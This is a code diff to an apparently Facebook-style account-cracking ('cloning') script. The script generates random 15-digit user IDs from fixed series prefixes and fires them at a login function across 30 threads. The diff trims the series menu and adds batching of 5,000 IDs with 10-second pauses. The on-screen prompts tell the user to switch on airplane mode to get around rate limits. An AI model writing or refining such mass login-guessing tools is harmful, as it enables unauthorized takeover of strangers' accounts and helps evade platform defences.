@@ -336,10 +336,7 @@ def SERIES_SELECTION():
     print(f'\x1b[38;5;46m[\033[1;97m3\x1b[38;5;46m] \033[1;97m100002 Series')
     print(f'\x1b[38;5;46m[\033[1;97m4\x1b[38;5;46m] \033[1;97m100003 Series')
     print(f'\x1b[38;5;46m[\033[1;97m5\x1b[38;5;46m] \033[1;97m100004 Series')
-    print(f'\x1b[38;5;46m[\033[1;97m6\x1b[38;5;46m] \033[1;97m100005 Series')
-    print(f'\x1b[38;5;46m[\033[1;97m7\x1b[38;5;46m] \033[1;97m100006 Series')
-    print(f'\x1b[38;5;46m[\033[1;97m8\x1b[38;5;46m] \033[1;97m100007 Series')
-    print(f'\x1b[38;5;46m[\033[1;97m9\x1b[38;5;46m] \033[1;97m100008 Series')
+    print(f'\x1b[38;5;46m[\033[1;97m6\x1b[38;5;46m] \033[1;97m100005 Series')    
     linex()
     
     series_choice = input(f'\x1b[38;5;46m[\033[1;97m🎯\x1b[38;5;46m] \033[1;97mSELECT SERIES \x1b[38;5;46m▶ \033[1;97m')
@@ -352,9 +349,6 @@ def SERIES_SELECTION():
         '4': '100003',
         '5': '100004',
         '6': '100005',
-        '7': '100006',
-        '8': '100007',
-        '9': '100008'
     }
     
     if series_choice in series_map:
@@ -377,18 +371,26 @@ def START_SERIES_CLONING(series_code):
     
     # Generate IDs with selected series code (15 digits total)
     for i in range(limit):
-        uid = series_code + ''.join(random.choices(string.digits, k=9))
+        data = ''.join(random.choice(string.digits) for _ in range(9))
+        uid = series_code + data
         user.append(uid)
-    with tred(max_workers=30) as jihad:
-        clear()
-        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mTOTAL ID \x1b[38;5;46m▶ \033[1;97m{len(user)}')
-        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSERIES CODE \x1b[38;5;46m▶ \033[1;97m{series_code}')
-        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE')
-        linex()
-        for mal in user:
-            uid = mal
-            jihad.submit(login1, uid)
+    # Batch system
+    batch_size = 5000   # ek batch me 5k IDs
+    thread_limit = 30   # threads limit
     
+    for i in range(0, len(user), batch_size):
+        batch = user[i:i+batch_size]
+        clear()
+        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mBATCH {i//batch_size + 1} STARTED...')
+        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mTOTAL ID IN BATCH ▶ \033[1;97m{len(batch)}')
+        linex()
+        
+        with tred(max_workers=thread_limit) as jihad:
+            for uid in batch:
+                jihad.submit(login1, uid)
+        print(f"\x1b[38;5;46m[\033[1;97m💤\x1b[38;5;46m] \033[1;97mWAITING 10 SECONDS BEFORE NEXT BATCH...")
+        time.sleep(10)			
+				
     line()
     print(f'\r\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mYOUR SERIES CRACKED HAS BEEN COMPLETED...\x1b[38;5;46m!')
     linex()
